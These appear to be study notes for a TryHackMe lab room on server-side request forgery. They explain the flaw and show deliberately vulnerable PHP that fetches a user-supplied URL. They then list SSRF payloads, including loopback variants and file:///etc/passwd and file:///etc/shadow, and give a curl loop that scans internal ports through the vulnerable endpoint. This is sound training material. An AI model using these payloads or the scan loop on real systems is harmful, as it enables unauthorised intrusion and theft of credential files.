# Room
https://tryhackme.com/room/ssrf

# Task 1 - What is SSRF
SSRF is Server Side Request Forgery.  It is a vulnerability in web applications where an attacker can make additional HTTP requests through the server to another resource on the backend.  In a typical scenario a web server has a backend app and db server, but a user is only allowed to access the web server on normal web ports, not the other servers.  The web server on the otherhand is allowed access to the backend app and db server.  The vulnerability comes into play when SSRF is used to make requests to the backend on behalf of the web server, which has the access.

# Task 2 - Cause of SSRF
The main cause of the vulnerability is through not sanitizing user input and input validation.

Example vulnerable code
```
<?php

if (isset($_GET['url']))

{
  $url = $_GET['url'];
  $image = fopen($url, 'rb');
  header("Content-Type: image/png");
  fpassthru($image);

}
```

In the code example there is no sanitization of input or input validation.

# Task 3 - SSRF Payload
Example
* Test payloads
    * http://127.0.0.1:3306
    * http://[::]:3306
    * http://localhost:3306
    * http://:::3306
    * convert IP address to decimal or hex
* Reading files
    * file:///etc/passwd
    * file:///etc/shadow
* Research
    * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

# Task 4 - Exercise
Find the open ports
    ```
    ip="10.10.76.7"; for i in {1..65000}; do curl --silent http://$ip:8000/attack?url=http%3A%2F%2F2130706433%3A$i | grep "is reachable!"; done
                    <p style="font-size:2em;color: black">  Target is reachable!  </p>
    ```
Count the users on the system
    ```
    file:///etc/passwd
    ```

# Task 5 - Solution
Walkthrough of the answers from Task 4